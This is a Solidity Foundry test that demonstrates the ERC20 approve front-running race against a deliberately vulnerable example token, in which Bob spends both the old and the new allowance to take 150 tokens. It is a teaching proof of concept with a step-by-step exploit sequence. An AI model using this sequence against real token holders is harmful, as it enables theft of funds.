// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../contracts/examples/ERC20Race.sol";

contract ERC20RaceTest is Test {
    ERC20RaceVulnerable public token;
    address public alice = address(0x1);
    address public bob = address(0x2);

    function setUp() public {
        token = new ERC20RaceVulnerable();
        // Give Alice 1000 tokens to start
        token.transfer(alice, 1000);
    }

    function testFrontRunningApproval() public {
        // 1. Alice initially approves Bob to spend 100 tokens
        vm.prank(alice);
        token.approve(bob, 100);

        // 2. Alice decides to change the allowance to 50.
        // In the real world, Bob sees this `approve(bob, 50)` in the mempool.
        
        // 3. Bob FRONT-RUNS the transaction by spending his original 100 allowance first.
        vm.prank(bob);
        token.transferFrom(alice, bob, 100);

        // 4. Alice's transaction finally gets mined, changing the allowance to 50.
        vm.prank(alice);
        token.approve(bob, 50);

        // 5. Bob immediately spends the NEW 50 token allowance.
        vm.prank(bob);
        token.transferFrom(alice, bob, 50);

        // Bob successfully stole 150 tokens when Alice only intended to allow 50.
        assertEq(token.balanceOf(bob), 150);
        
        // Confirm the vulnerability worked
        console.log("Bob's Balance Post-Attack:", token.balanceOf(bob));
    }
}
